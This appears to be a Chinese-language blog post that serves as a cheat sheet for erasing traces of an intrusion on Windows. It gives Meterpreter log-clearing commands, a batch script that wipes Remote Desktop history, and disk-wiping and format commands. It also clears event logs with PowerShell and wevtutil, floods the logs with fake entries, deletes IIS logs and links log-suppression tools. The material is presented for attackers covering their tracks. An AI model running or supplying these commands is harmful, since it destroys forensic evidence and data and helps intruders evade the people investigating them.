---
title: Windows 入侵痕迹清理
date: 2022-09-14
tags:
  - security
  - networking
categories:
  - tech
---



# Windows 入侵痕迹清理

## Metasploit

查看事件日志

```bash
meterpreter > run event_manager -i
```

清除事件日志

```bash
meterpreter > run event_manager  -c
```

从应用、系统、安全模块三个方面清理历史记录

```bash
meterpreter > clearev
```



## Remote Desktop

clearRD.bat

```bash
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\
attrib Default.rdp -s -h
del Default.rdp
```



## Hard Disk

clearHD.bat

```bash
cipher /w:D:\tools		% 三次擦写 %
```

```bash
format D: /P:8			% 清零再(8次)擦写 %
```



## 事件日志

清理：

```
PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"

Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}
```



停止日志记录：https://github.com/hlldz/Invoke-Phant0m

删除指定日志：https://github.com/QAX-A-Team/EventCleaner



**伪造日志**

利用 [TCCLI](https://cloud.tencent.com/document/product/440/6176)  eventcreate，在日志中生成大量垃圾信息。

```
eventcreate -l system -so administrator -t warning -d "this is a test" -id 500
```



### IIS

```
net stop w3svc
cd %SystemDrive%\inetpub\logs\LogFiles\W3SVC1\
del *
net start w3svc
```









**清除历史**：`del /f /s /q “%userprofile%\Recent*.*`
